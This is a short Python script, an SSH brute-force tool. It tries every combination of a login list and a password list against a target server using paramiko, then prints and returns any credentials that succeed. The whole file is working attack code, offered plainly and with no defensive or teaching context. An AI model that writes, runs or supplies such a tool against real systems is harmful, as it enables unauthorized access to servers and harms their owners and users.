import asyncio
import paramiko

async def ssh_try(target, port, login, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(target, port=port, username=login, password=password, timeout=5)
        print(f"[SUCCESS] Login: {login} | Password: {password}")
        ssh.close()
        return login, password
    except paramiko.AuthenticationException:
        return None
    except Exception as e:
        print(f"[ERROR] {e}")
        return None
    
async def ssh_bruteforce(target, port, login_list, password_list):
    tasks = []
    for login in login_list:
        for password in password_list:
            tasks.append(ssh_try(target, port, login, password))

    results = await asyncio.gather(*tasks)
    return [result for result in results if result is not None]